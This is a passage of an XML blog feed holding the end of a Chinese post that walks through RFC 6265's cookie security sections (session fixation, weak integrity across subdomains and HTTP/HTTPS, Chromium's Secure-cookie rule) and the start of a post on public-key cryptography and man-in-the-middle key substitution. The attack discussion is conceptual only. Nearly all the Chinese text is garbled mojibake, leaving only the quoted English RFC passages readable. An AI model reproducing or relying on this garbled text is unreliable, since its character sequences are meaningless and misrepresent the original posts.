å…¶å¯¦ç•¶åˆåœ¨ RFC 2109 å°±æœ‰è«‡è«–éç¬¬ä¸‰æ–¹ cookie çš„è­°é¡Œï¼Œåªæ˜¯é‚£æ™‚å€™å«åš Unverifiable Transactionsï¼Œçœ‹åˆ°çš„æ™‚å€™æˆ‘æœ‰åš‡äº†ä¸€è·³ï¼Œåœ¨ 1997 å¹´å‰›æœ‰ cookie çš„æ™‚å€™å°±å·²ç¶“æåˆ°äº†ç¬¬ä¸‰æ–¹ cookie çš„å•é¡Œã€‚
ç•¢ç«Ÿé€™å€‹å•é¡Œæ„Ÿè¦ºåœ¨è¿‘æœŸæ‰æ¯”è¼ƒè¢«å»£æ³›è¨è«–ï¼Œè€Œä¸”åœ¨è¿‘å¹¾å¹´ Safari è·Ÿ Firefox æ‰é è¨­é˜»æ“‹ç¬¬ä¸‰æ–¹ cookieã€‚ç”šè‡³é€£ Facebook ä¹‹å¾Œçš„è§£æ³• dynamic URLs éƒ½æ—©å·²å‡ºç¾åœ¨ RFC 6265 ä¸Šé¢ï¼ˆæˆ‘è¶…è¨å­é‚£ä¸² fbcidâ€¦ï¼‰ã€‚
æœ€å¾Œæˆ‘å€‘ä¾†çœ‹ä¸€äº›è·Ÿå®‰å…¨æ€§ç›¸é—œçš„æ±è¥¿ï¼Œéƒ½åœ¨ 8.Security Considerations è£¡é¢ï¼š

8.4. Session Identifiers
Instead of storing session information directly in a cookie (where it might be exposed to or replayed by an attacker), servers commonly store a nonce (or â€œsession identifierâ€) in a cookie.  When the server receives an HTTP request with a nonce, the server can look up state information associated with the cookie using the nonce as a key.
æ¯”èµ·æŠŠ session è³‡è¨Šç›´æ¥å­˜åœ¨ cookie è£¡é¢ï¼Œserver é€šå¸¸åªåœ¨ cookie è£¡é¢å­˜ä¸€å€‹ sessionIDï¼Œç•¶ server æ”¶åˆ°é€™å€‹ sessionID çš„æ™‚å€™å°±èƒ½å¤ æ‰¾åˆ°ç›¸å°æ‡‰çš„è³‡æ–™ã€‚
Using session identifier cookies limits the damage an attacker can cause if the attacker learns the contents of a cookie because the nonce is useful only for interacting with the server (unlike non- nonce cookie content, which might itself be sensitive).  Furthermore, using a single nonce prevents an attacker from â€œsplicingâ€ together cookie content from two interactions with the server, which could cause the server to behave unexpectedly.
è·Ÿç›´æ¥æŠŠæ•æ„Ÿè³‡è¨Šå­˜åœ¨ cookie æ¯”èµ·ä¾†ï¼Œåªå­˜ sessionID èƒ½å¤ ä¾·é™æ”»æ“Šè€…æ‰€èƒ½é€ æˆçš„å‚·å®³ï¼Œå› ç‚ºå°±ç®—æ”»æ“Šè€…çŸ¥é“è£¡é¢å­˜äº† sessionID ä¹Ÿæ²’ä»€éº¼ç”¨ã€‚ï¼ˆsplicing é‚£æ®µçœ‹å¾—ä¸æ˜¯å¾ˆæ‡‚ï¼‰
Using session identifiers is not without risk.  For example, the server SHOULD take care to avoid â€œsession fixationâ€ vulnerabilities. A session fixation attack proceeds in three steps.  First, the attacker transplants a session identifier from his or her user agent to the victimâ€™s user agent.  Second, the victim uses that session identifier to interact with the server, possibly imbuing the session identifier with the userâ€™s credentials or confidential information. Third, the attacker uses the session identifier to interact with server directly, possibly obtaining the userâ€™s authority or confidential information.
ä½¿ç”¨ sessionID ä¹Ÿä¸æ˜¯å®Œå…¨æ²’æœ‰é¢¨éšªã€‚èˆ‰ä¾‹ä¾†èªªï¼Œserver æ‡‰è©²è¦é¿å… session fixation é€™ç¨®æ”»æ“Šæ–¹æ³•ã€‚é€™ç¨®æ”»æ“Šæ–¹æ³•æœ‰ä¸‰å€‹æ­¥é©Ÿï¼Œç¬¬ä¸€å€‹æ­¥é©Ÿæ˜¯å…ˆç”¢ç”Ÿä¸€å€‹ sessionIDï¼Œä¸¦ä¸”æŠŠé€™ ID å‚³çµ¦å—å®³è€…ï¼›ç¬¬äºŒæ­¥æ˜¯å—å®³è€…ç”¨é€™å€‹ sessionID ä¾†ç™»å…¥ï¼›åœ¨å—å®³è€…ç™»å…¥ä»¥å¾Œï¼Œæ”»æ“Šè€…å°±èƒ½å¤ ä½¿ç”¨åŒæ¨£çš„ sessionID å–å¾—å—å®³è€…çš„è³‡æ–™ã€‚

åŸæ–‡å°å›ºå®š Sessionï¼ˆSession fixationï¼‰çš„èªªæ˜æ²’æœ‰å¾ˆæ¸…æ¥šï¼Œæœ‰èˆˆè¶£çš„æœ‹å‹å¯ä»¥åƒè€ƒ HTTP Session æ”»æ“Šèˆ‡é˜²è­·ï¼Œé€™ç¯‡è¬›å¾—æ¯”è¼ƒæ¸…æ¥šä¸€é»ã€‚
ç°¡å–®ä¾†èªªå°±æ˜¯è®“å—å®³è€…ç”¨ä½ æŒ‡å®šçš„ sessionID ç™»å…¥ï¼Œæ‰€ä»¥åœ¨ Server ç«¯é€™å€‹ sessionID å°±æœƒè·Ÿå—å®³è€…çš„å¸³è™Ÿç¶åœ¨ä¸€èµ·ã€‚æ¥è‘—ä½ å†ç”¨åŒæ¨£çš„ sessionIDï¼Œå°±å¯ä»¥ç”¨å—å®³è€…çš„èº«ä»½ç™»å…¥ä¸¦ä¸”ä½¿ç”¨ç¶²ç«™ã€‚
æ¥è‘—æˆ‘å€‘å†ä¾†çœ‹å¦å¤–ä¸€å€‹å®‰å…¨æ€§å•é¡Œï¼š

8.6. Weak Integrity
Cookies do not provide integrity guarantees for sibling domains (and their subdomains).  For example, consider foo.example.com and bar.example.com.  The foo.example.com server can set a cookie with a Domain attribute of â€œexample.comâ€ (possibly overwriting an existing â€œexample.comâ€ cookie set by bar.example.com), and the user agent will include that cookie in HTTP requests to bar.example.com.  In the worst case, bar.example.com will be unable to distinguish this cookie from a cookie it set itself.  The foo.example.com server might be able to leverage this ability to mount an attack against bar.example.com.
Cookies å° subdomain ä¸¦ä¸å…·æœ‰å®Œæ•´æ€§ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œfoo.example.com å¯ä»¥å° example.com è¨­ç½® cookieï¼Œè€Œé€™å€‹æœ‰å¯èƒ½æŠŠ bar.example.com å° example.com è¨­ç½®çš„ cookie çµ¦è“‹æ‰ã€‚æœ€ç³Ÿçš„æƒ…æ³ä¸‹ï¼Œç•¶ bar.example.com æ”¶åˆ°é€™å€‹ cookie æ™‚ï¼Œå€åˆ†ä¸å‡ºæ˜¯è‡ªå·±è¨­ç½®çš„é‚„æ˜¯åˆ¥äººè¨­ç½®çš„ã€‚foo.example.com å°±å¯ä»¥åˆ©ç”¨é€™å€‹ç‰¹æ€§ä¾†æ”»æ“Š bar.example.comã€‚
An active network attacker can also inject cookies into the Cookie header sent to https://example.com/ by impersonating a response from http://example.com/ and injecting a Set-Cookie header.  The HTTPS server at example.com will be unable to distinguish these cookies from cookies that it set itself in an HTTPS response.  An active network attacker might be able to leverage this ability to mount an attack against example.com even if example.com uses HTTPS exclusively.
æ”»æ“Šé‚„å¯ä»¥åˆ©ç”¨ http://example.com/ ä¾†æŠŠ https://example.com/ï¼ˆå‰è€…æ˜¯ httpï¼Œå¾Œè€… httpsï¼‰çš„ cookie è“‹æ‰ï¼Œserver å°±ç„¡æ³•åˆ†è¾¨é€™å€‹ cookie æ˜¯ http é‚„æ˜¯ https è¨­ç½®çš„ã€‚æ”»æ“Šè€…ä¸€æ¨£å¯ä»¥åˆ©ç”¨é€™å€‹ç‰¹æ€§ä¾†é€²è¡Œæ”»æ“Šã€‚

ä¸Šé¢é€™ä¸€æ®µåœ¨ 4.1.2.5 The Secure Attribute å…¶å¯¦ä¹Ÿæœ‰æåˆ°ï¼š

Although seemingly useful for protecting cookies from active network attackers, the Secure attribute protects only the cookieâ€™s confidentiality. An active network attacker can overwrite Secure cookies from an insecure channel, disrupting their integrity

å¤§æ„å°±æ˜¯èªª Secure å±¬æ€§æ²’è¾¦æ³•ä¿éšœ cookie çš„å®Œæ•´æ€§ã€‚æ”»æ“Šè€…å¯ä»¥å¾ HTTP è¦†è“‹æ‰ HTTPS çš„ cookieã€‚
çœ‹åˆ°é€™é‚Šçš„æ™‚å€™æˆ‘å¿ƒé ­ä¸€é©šï¼Œé€™å€‹ä¸å°±æ˜¯åœ¨è¬›æˆ‘ä¹‹å‰å¯«éçš„ï¼šæˆ‘é‡éçš„æœ€é›£çš„ Cookie å•é¡Œå—ï¼Ÿç¾åœ¨æˆ‘ä¹Ÿçµ‚æ–¼çŸ¥é“ç‚ºä»€éº¼ Safari è·Ÿ Firefox éƒ½æ²’æœ‰æ“‹é€™ç¨®è¡Œç‚ºï¼Œå› ç‚ºåœ¨è¦æ ¼è£¡é¢ä¸¦æ²’æœ‰è¦æ±‚ä½ ä¸€å®šè¦æ“‹ã€‚
è‡³æ–¼ Chrome çš„è©±ï¼Œå®ƒçš„å¯¦ä½œåƒè€ƒäº†å¹¾å€‹ä¸åŒçš„ RFCï¼Œåœ¨è² è²¬ç®¡ç† Cookie çš„ CookieMonster è£¡é¢æœ‰å¯«åˆ°ï¼š

CookieMonster requirements are, in theory, specified by various RFCs. RFC 6265 is currently controlling, and supersedes RFC 2965.
 However, most browsers do not actually follow those RFCs, and Chromium has compatibility with existing browsers as a higher priority than RFC compliance.
An RFC that more closely describes how browsers normally handles cookies is being considered by the RFC; it is available at http://tools.ietf.org/html/draft-ietf-httpstate-cookie.  The various RFCs should be examined to understand basic cookie behavior; this document will only describe variations from the RFCs.

åœ¨ CookieMonster.cc è£¡é¢ä¹Ÿæœ‰å¯«åˆ°ï¼š

If the cookie is being set from an insecure scheme, then if a cookie already exists with the same name and it is Secure, then the cookie should not be updated if they domain-match and ignoring the path attribute.
See: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone

æ–‡ä¸­æ‰€æåˆ°çš„æ–‡ä»¶é‚„åœ¨è‰ç¨¿éšæ®µï¼Œæ¨™é¡Œæ˜¯ï¼šã€ŒDeprecate modification of â€˜secureâ€™ cookies from non-secure originsã€ï¼Œæ˜¯ç”± Google çš„å“¡å·¥æ‰€ç™¼èµ·çš„è‰ç¨¿ã€‚åœ¨ Introduction çš„åœ°æ–¹å¯«çš„å¾ˆæ˜ç¢ºäº†ï¼š

Section 8.5 and Section 8.6 of [RFC6265] spell out some of the drawbacks of cookiesâ€™ implementation: due to historical accident, non-secure origins can set cookies which will be delivered to secure origins in a manner indistinguishable from cookies set by that origin itself.  This enables a number of attacks, which have been recently spelled out in some detail in [COOKIE-INTEGRITY].


We can mitigate the risk of these attacks by making it more difficult for non-secure origins to influence the state of secure origins. Accordingly, this document recommends the deprecation and removal of non-secure originsâ€™ ability to write cookies with a â€˜secureâ€™ flag, and their ability to overwrite cookies whose â€˜secureâ€™ flag is set.

å¤§æ„å°±æ˜¯èªªè·Ÿæˆ‘å€‘å‰›å‰›åœ¨ RFC 6265 çš„ Section 8.5 èˆ‡ 8.6 çœ‹åˆ°çš„ä¸€æ¨£ï¼Œç”±æ–¼ä¸€äº›æ­·å²å› ç´ ï¼Œsecure çš„ cookie å¯ä»¥è¢« non-secure çš„ä¾†æºè“‹æ‰ã€‚è€Œé€™ä»½æ–‡ä»¶å°±æ˜¯è¦è©¦è‘—é˜»æ­¢é€™ç¨®è¡Œç‚ºã€‚
çœ‹åˆ°é€™é‚Šï¼Œèˆ‡ Session è·Ÿ Cookie ç›¸é—œçš„æ–‡ä»¶å·®ä¸å¤šéƒ½è®€å®Œäº†ï¼Œè®“æˆ‘å€‘åšå€‹ç°¡å–®çš„ç¸½çµã€‚
ç¸½çµå›åˆ°æœ€é–‹å§‹çš„å•é¡Œï¼šåˆ°åº• Session æ˜¯ä»€éº¼ï¼Ÿ
å¾ RFC è£¡é¢æåˆ°çš„å„ç¨® Session ç›¸é—œçš„å­—çœ¼ï¼Œæˆ‘æœƒèªç‚º Session å°±æ˜¯å®ƒè‹±æ–‡çš„åŸæ„ä¹‹ä¸€ï¼Œä»£è¡¨è‘—ï¼šã€Œå…·æœ‰ç‹€æ…‹çš„ä¸€æ®µæœŸé–“ã€æˆ–è€…æ˜¯ã€Œä¸Šä¸‹æ–‡ã€ï¼Œæ‰€ä»¥ä½ æƒ³è¦é–‹å•Ÿæˆ–æ˜¯å»ºç«‹ä¸€å€‹ Sessionï¼Œå¿…è¦æ¢ä»¶å°±æ˜¯å…ˆæœ‰ä¸€å€‹æ©Ÿåˆ¶ä¾†å»ºç«‹åŠä¿ç•™ç‹€æ…‹ã€‚
é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼ Cookie çš„ RFC æ¨™é¡Œç‚ºï¼šHTTP State Management Mechanismï¼Œç‹€æ…‹ç®¡ç†æ©Ÿåˆ¶ã€‚åœ¨ Cookie é‚„æ²’å‡ºç¾ä»¥å‰ï¼Œä¸€æ¨£å¯ä»¥å»ºç«‹ Sessionï¼Œå¯ä»¥æŠŠç‹€æ…‹è³‡è¨Šæ”¾åœ¨ç¶²å€åˆ—ä¸Šé¢æˆ–æ˜¯è—åœ¨ form è¡¨å–®ä¸­ã€‚ä½† Cookie å‡ºç¾ä»¥å¾Œå»ºç«‹ Session è®Šæˆä¸€ä»¶æ›´å®¹æ˜“çš„äº‹ï¼Œåªè¦ä½¿ç”¨ Set-Cookie èˆ‡ Cookie é€™å…©å€‹ header å°±å¥½äº†ã€‚
å»ºç«‹ Session ä¹‹å¾Œï¼Œæ‰€å„²å­˜çš„ç‹€æ…‹å°±å«åš Session informationï¼Œå¯ä»¥ç¿»ä½œ Session è³‡è¨Šã€‚è‹¥æ˜¯é¸æ“‡æŠŠé€™äº›è³‡è¨Šå­˜åœ¨ Cookie è£¡é¢ï¼Œå°±å«åš Cookie-based sessionï¼›é‚„æœ‰å¦ä¸€ç¨®æ–¹æ³•å‰‡æ˜¯åœ¨ Cookie è£¡é¢åªå­˜ä¸€å€‹ SessionIDï¼Œå…¶ä»–çš„ Session è³‡è¨Šéƒ½å­˜åœ¨ Server ç«¯ï¼Œé è‘—é€™å€‹ ID æŠŠå…©è€…é—œè¯èµ·ä¾†ã€‚
é™¤äº† Session ä»¥å¤–ï¼Œæˆ‘å€‘ä¹Ÿåœ¨ RFC è£¡é¢çœ‹è¦‹ä¸€äº›æœ‰è¶£çš„æ±è¥¿ï¼Œä¾‹å¦‚èªªç¬¬ä¸‰æ–¹ Cookie çš„éš±ç§ç–‘æ…®ä»¥åŠèˆ‡ Cookie ç›¸é—œçš„å®‰å…¨æ€§å•é¡Œï¼Œé€™äº›éƒ½èƒ½åŠ æ·±ä½ å°æ–¼ Cookie çš„ç†è§£ã€‚
åœ¨çµæŸä»¥å‰ï¼Œæˆ‘èª å¿ƒæ¨è–¦ä¸€ç¯‡æ–‡ç« ï¼šHTTP Cookies: Standards, Privacy, and Politicsï¼Œç¶²é å³é‚Šå¯ä»¥ä¸‹è¼‰ PDF ä¾†çœ‹ã€‚é€™ç¯‡æ–‡ç« çš„ä½œè€…å°±æ˜¯ RFC 2109 èˆ‡ 2965 çš„ä½œè€…ã€‚æ–‡ç« è£¡é¢æŠŠ Cookie å‡ºç¾çš„æ­·å²ä»¥åŠç•¶åˆç™¼ç”Ÿçš„äº‹è¬›çš„ä¸€æ¸…äºŒæ¥šï¼Œå¼·çƒˆå»ºè­°å¤§å®¶éƒ½å¯ä»¥èŠ±é»æ™‚é–“ä¾†çœ‹é€™ç¯‡æ–‡ç« ï¼Œå¯ä»¥æ·±å…¥åœ°ç†è§£ Cookie èˆ‡ Session æ—©æœŸçš„æ­·å²ã€‚
æœ€å¾Œï¼Œåˆ¥å¿˜äº†é€™æ˜¯ç³»åˆ—æ–‡çš„ç¬¬äºŒç¯‡ï¼Œä¸‹ä¸€ç¯‡æˆ‘å€‘æœƒä¾†çœ‹ä¸€äº›ä¸»æµæ¡†æ¶å¦‚ä½•è™•ç† Sessionã€‚
ä¸‰ç¯‡çš„å®Œæ•´é€£çµå¦‚ä¸‹ï¼š

ç™½è©± Session èˆ‡ Cookieï¼šå¾ç¶“ç‡Ÿé›œè²¨åº—é–‹å§‹
æ·ºè«‡ Session èˆ‡ Cookieï¼šä¸€èµ·ä¾†è®€ RFC
æ·±å…¥ Session èˆ‡ Cookieï¼šExpressã€PHP èˆ‡ Rails çš„å¯¦ä½œ

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>web</tag>
        <tag>cookie</tag>
        <tag>session</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¶²è·¯å®‰å…¨(1) - åŸºç¤å¯†ç¢¼å­¸</title>
    <url>/2017/04/16/simple-cryptography/</url>
    <content><![CDATA[åŸºç¤å¯†ç¢¼å­¸å¯†ç¢¼å­¸è£¡é¢æœ‰å…©ç¨®åŠ è§£å¯†æ–¹å¼ï¼Œä¸€ç¨®æ˜¯å°ç¨±æ€§åŠ å¯†ï¼Œä¸€ç¨®æ˜¯éå°ç¨±æ€§åŠ å¯†ã€‚å·®åˆ¥å¾ˆç°¡å–®ï¼Œå°ç¨±æ€§åŠ å¯†ï¼Œæ„æ€å°±æ˜¯æˆ‘åŠ å¯†è·Ÿè§£å¯†ç”¨çš„æ˜¯åŒä¸€å€‹é‘°åŒ™ï¼Œæ‰€ä»¥åªè¦ A è·Ÿ B éƒ½çŸ¥é“é€™æŠŠé‘°åŒ™ï¼ŒA è¦å‚³çµ¦ B çš„æ™‚å€™ï¼Œå°±ç”¨é€™å€‹é‘°åŒ™åŠ å¯†ã€‚B æ‹¿åˆ°äº†ä¹‹å¾Œå†ç”¨åŒä¸€å€‹é‘°åŒ™è§£å¯†ï¼Œä½ å€‘å…©å°±å¯ä»¥äº’é€šæœ‰ç„¡ï¼Œæš—é€šæ¬¾æ›²ã€‚å³ä½¿æœ‰ä¸­é–“äººæ””æˆªäº†ä½ å€‘çš„å‚³è¼¸ï¼Œåªè¦ä»–æ²’æœ‰ä½ å€‘çš„é‘°åŒ™ï¼Œä»–å°±ä¸çŸ¥é“ä½ å€‘åœ¨å¹¹éº»ã€‚
é‚£ bug æ˜¯ä»€éº¼å‘¢ï¼Ÿé˜¿å“ˆï¼é‚£ä½ å€‘è¦å·ä¾†æš—å»ä¹‹å‰ï¼Œç¸½æ˜¯éœ€è¦å‚³ç¬¬ä¸€æ¬¡å‘Šè¨´å°æ–¹ä½ å€‘çš„é‘°åŒ™å§ï¼Ÿè¦æ˜¯ç¬¬ä¸€æ¬¡å°±è¢«ä¸­é–“äººæ””æˆªï¼Œä½ å€‘ä¸å°±æ²’æˆ²äº†å—ï¼Ÿä»–æ””æˆªåˆ°å·å·è¨˜ä¸‹ä¾†å¾Œå†åŸå°ä¸å‹•å‚³çµ¦æ¥å—æ–¹ï¼Œé‚£ä¹‹å¾Œçš„æ‰€æœ‰æ””æˆªåˆ°çš„åŠ å¯†å¾Œçš„è¨Šæ¯ï¼Œä»–éƒ½æœ‰ä½ å€‘å…±æœ‰çš„é‘°åŒ™å¯ä»¥è§£å¯†äº†ã€‚é‚£è©²æ€éº¼è¾¦å‘¢ï¼Ÿ
éå°ç¨±å¼åŠ å¯†è‹±é›„ç™»å ´
éå°ç¨±å¼åŠ å¯†ï¼Œå°±æ˜¯æ¯å€‹é‘°åŒ™ pair æœ‰å…©å€‹é‘°åŒ™ï¼Œä¸€å€‹å…¬é‘°ä¸€å€‹ç§é‘°ã€‚
å¯ä»¥å…¬é‘°åŠ å¯†ç§é‘°è§£å¯†ï¼Œä¹Ÿå¯ä»¥ç§é‘°åŠ å¯†å…¬é‘°è§£å¯†ã€‚
å¯ä»¥å…¬é‘°åŠ å¯†ç§é‘°è§£å¯†ï¼Œä¹Ÿå¯ä»¥ç§é‘°åŠ å¯†å…¬é‘°è§£å¯†ã€‚
å¯ä»¥å…¬é‘°åŠ å¯†ç§é‘°è§£å¯†ï¼Œä¹Ÿå¯ä»¥ç§é‘°åŠ å¯†å…¬é‘°è§£å¯†ã€‚
å¾ˆé‡è¦æ‰€ä»¥èªªä¸‰æ¬¡ã€‚
å‚³è¨Šä¹‹å‰å‘¢ï¼ŒA è·Ÿ B éƒ½å…ˆç”Ÿæˆä¸€çµ„å…¬ç§é‘°çš„ pairï¼ŒA æŠŠ A çš„å…¬é‘°å‚³çµ¦ Bï¼ŒB æŠŠ B çš„å…¬é‘°å‚³çµ¦ Aã€‚
å¥½ç¾åœ¨ A æœ‰ä»–è‡ªå·±çš„ç§é‘°è·Ÿ B çš„å…¬é‘°ï¼ŒB æœ‰ä»–è‡ªå·±çš„ç§é‘°è·Ÿ A çš„å…¬é‘°ã€‚A è¦å‚³æ±è¥¿çµ¦ B å°±ç”¨ B çš„å…¬é‘°åŠ å¯†ï¼Œç„¶å¾Œ B æ‹¿åˆ°ä¹‹å¾Œç”¨ B è‡ªå·±çš„ç§é‘°è§£å¯†ã€‚ä¸€åˆ‡æå®šï¼Œå³ä½¿åœ¨ä¸­é€”è¢«æ””æˆªï¼Œåªè¦ B çš„ç§é‘°æ²’æœ‰æµå‡ºå°±å®Œå…¨ä¸æœƒæœ‰äº‹ã€‚åä¹‹äº¦ç„¶ã€‚
ä¸­å¿ƒæ€æƒ³å°±æ˜¯åˆ©ç”¨å…¬é‘°å¯ä»¥ç”¨ä¾†åŠ å¯†çš„ç‰¹æ€§ï¼Œè€Œå¦‚æœä½ æ˜¯ç”¨å…¬é‘°åŠ å¯†ä½ å¿…é ˆè¦ç”¨ç§é‘°è§£å¯†ã€‚æ‰€ä»¥æˆ‘æ ¹æœ¬ä¸æ€•å…¬é‘°æµå‡º(å…¬é–‹çµ¦æ‰€æœ‰äººä¹Ÿæ²’å·®)ï¼Œåªè¦æˆ‘ç§é‘°ä¿å­˜å¥½å°±å¥½ï¼Œæˆ‘ç§é‘°æ ¹æœ¬å°±æ²’å‚³éï¼Œä¹Ÿä¸å¯èƒ½è¢«æ””æˆªã€‚
é‚£ç‚ºä»€éº¼é€™è§£æ±ºäº†å°ç¨±æ€§åŠ å¯†çš„å•é¡Œå‘¢ï¼Ÿå› ç‚ºç¬¬ä¸€æ¬¡çš„å‚³è¼¸ä¹Ÿåªäº’å‚³å…¬é‘°ï¼Œæ‰€ä»¥å³ä½¿å…¬é‘°è¢«æ””æˆªï¼Œä¹‹å¾Œä¸­é–“äººæ‹¿åˆ°åŠ å¯†éçš„è¨Šæ¯ä¹Ÿä¸èƒ½æ€éº¼æ¨£ï¼Œå› ç‚ºé‚£å€‹è¦å°æ–¹çš„ç§é‘°æ‰èƒ½è§£ï¼Œæ‰€ä»¥ä¸€åˆ‡éƒ½éå¸¸çš„ç¾å¥½â€¦

é€™è£¡æ˜¯å€‹ä¼ç­†ï¼Œç­‰ç­‰æœƒå›ä¾†ã€‚ç¬¬ä¸€æ¬¡æœ‰ä¼ç­†æœƒå…ˆè‡ªå·±èªªè‡ªå·±æ˜¯ä¼ç­†ï¼Œçœ‹åˆ°é€™è£¡ä½ å°±çŸ¥é“é€™ç¯‡æ–‡ç« çµ•ä¸ç°¡å–®ï¼Œéæ¯”å°‹å¸¸ã€‚
æ•¸ä½ç°½ç« æ•…äº‹ç¹¼çºŒï¼Œé‚£æ—¢ç„¶å¤§å®¶éƒ½æœ‰ B çš„ public key ï¼Œé‚£ä»»ä½•äººéƒ½å¯ä»¥ç”¨ B çš„å…¬é‘°åŠ å¯†å‚³è¨Šæ¯çµ¦ Bï¼Œé‚£ B æ€éº¼çŸ¥é“å“ªå€‹æ˜¯ A å¯«çš„å“ªå€‹æ˜¯åˆ¥äººå½é€ çš„å‘¢ï¼Ÿé€™è£¡å°±è¦å¼•é€²æ•¸ä½ç°½ç« çš„æ¦‚å¿µã€‚
ä½†èªªç ´å“ªå€¼å¹¾æ–‡éŒ¢ï¼Ÿæ•¸ä½ç°½ç« å°±æ˜¯ A åœ¨å‚³é€è¨Šæ¯å‰ï¼Œç”¨ A çš„ç§é‘°åŠ å¯†ï¼Œå‚³çµ¦ Bã€‚B å†ç”¨ A çš„å…¬é‘°ä¾†çœ‹æ˜¯ä¸æ˜¯çœŸçš„æ˜¯ A ç°½åçš„(äº‹å¯¦ä¸Šæ˜¯å°å…§å®¹çš„ Hash ç°½åï¼Œä¸éç‚ºäº†è¬›è§£æ–¹ä¾¿ï¼Œå°±å…ˆç•¶ç›´æ¥å°å…§å®¹ç°½)ã€‚
é€™è£¡é‹ç”¨çš„æ˜¯å¯ä»¥å…¬é‘°åŠ å¯†ç§é‘°è§£å¯†ï¼Œä¹Ÿå¯ä»¥ç§é‘°åŠ å¯†å…¬é‘°è§£å¯†çš„ç¬¬äºŒå€‹ç‰¹æ€§ã€‚
ä½ èªªå…¬é‘°æ‰€æœ‰äººéƒ½æœ‰æ€éº¼è¾¦ï¼Ÿåæ­£å…¨ä¸–ç•Œéƒ½çŸ¥é“é€™è¨Šæ¯æ˜¯Açš„è¨Šæ¯ä¹Ÿæ²’é—œä¿‚ï¼Œåªè¦æ²’æœ‰ B çš„ç§é‘°å°±æ²’æœ‰å…¶ä»–äººå¯ä»¥çœ‹åˆ°å…§å®¹ï¼
èæœƒè²«é€šé©—æ”¶æˆæœçš„æ™‚é–“ä¾†äº†ã€‚æ‰€ä»¥ä»Šå¤© A è¦å‚³è¨Šæ¯çµ¦ B è¦æ€éº¼æ¨£è®“é€™è¨Šæ¯åªæœ‰ B çœ‹å¾—åˆ°ï¼Œè€Œä¸” B ä¹Ÿç¢ºå®šæ˜¯ A å¯«çš„ä¸æ˜¯åˆ¥äººå¯«çš„å‘¢ï¼Ÿ
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
ä¸€é–‹å§‹ A å…ˆæŠŠ A çš„å…¬é‘°å‚³çµ¦ Bï¼ŒB å…ˆæŠŠ B çš„å…¬é‘°å‚³çµ¦ Aã€‚
A è¦å‚³çµ¦ B ä¹‹å‰ï¼ŒæŠŠè¦å‚³çš„å…§å®¹ï¼Œå…ˆç”¨ B çš„å…¬é‘°åŠ å¯†å†ç”¨ A çš„ç§é‘°ç°½ï¼Œç„¶å¾Œ B ç”¨ A çš„å…¬é‘°ç¢ºèªç°½ç« å†ç”¨ B çš„ç§é‘°è§£å¯†å…§å®¹ã€‚
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
ç°¡å–®å§ï¼æ­å–œä½ å·²ç¶“æ¯”å¤§å¤šæ•¸äººåŸºç¤éƒ½å¥½äº†ã€‚
èªªå¥½çš„ä¼ç­†å‘¢å¦‚æœä»Šå¤©å‡ºç¾äº†ä¸€å€‹ç¥ç´šçš„ä¸­é–“äººï¼Œé‚„æ˜¯æœ‰è¾¦æ³•ç ´è§£ï¼Œæ€éº¼ç ´å‘¢ï¼Ÿ

åœ¨ä¸€é–‹å§‹ A è¦å‚³é€ A çš„å…¬é‘°çµ¦ B çš„æ™‚å€™ï¼Œè¦æ˜¯è¢« C æ””æˆªï¼ŒC å°±å¯ä»¥çˆ½æ‹¿ A çš„å…¬é‘°ã€‚ç„¶å¾Œå‘¢ï¼Ÿè‡ªå·±å†ç”Ÿå€‹å…¬ç§é‘° pairï¼ŒæŠŠ C çš„å…¬é‘° 1 çµ¦ Bï¼Œè·Ÿä»–èªªé€™æ˜¯ A çš„å…¬é‘°ã€‚
åœ¨ä¸€é–‹å§‹ B è¦å‚³é€ B çš„å…¬é‘°çµ¦ A çš„æ™‚å€™ï¼Œè¦æ˜¯è¢« C æ””æˆªï¼ŒC å°±å¯ä»¥çˆ½æ‹¿ B çš„å…¬é‘°ã€‚ç„¶å¾Œå‘¢ï¼Ÿè‡ªå·±å†ç”Ÿå¦ä¸€å€‹å…¬ç§é‘° pairï¼ŒæŠŠ C çš„å…¬é‘° 2 çµ¦ Aï¼Œè·Ÿä»–èªªé€™æ˜¯ B çš„å…¬é‘°ã€‚
A å’Œ B ä»¥ç‚ºæ‹¿è‘—å°æ–¹çš„å…¬é‘°ã€‚
ä»Šå¤© A è¦å‚³çµ¦ Bï¼Œä»–ä»¥ç‚ºä»–ç”¨ B çš„å…¬é‘°åŠ å¯†(äº‹å¯¦ä¸Šä»–ç”¨äº†å…¬é‘° C2)ï¼Œå†ç”¨ A çš„ç§é‘°ç°½ï¼Œæƒ³å‚³é€çµ¦ B ä½†è¢« C æ””æˆªã€‚
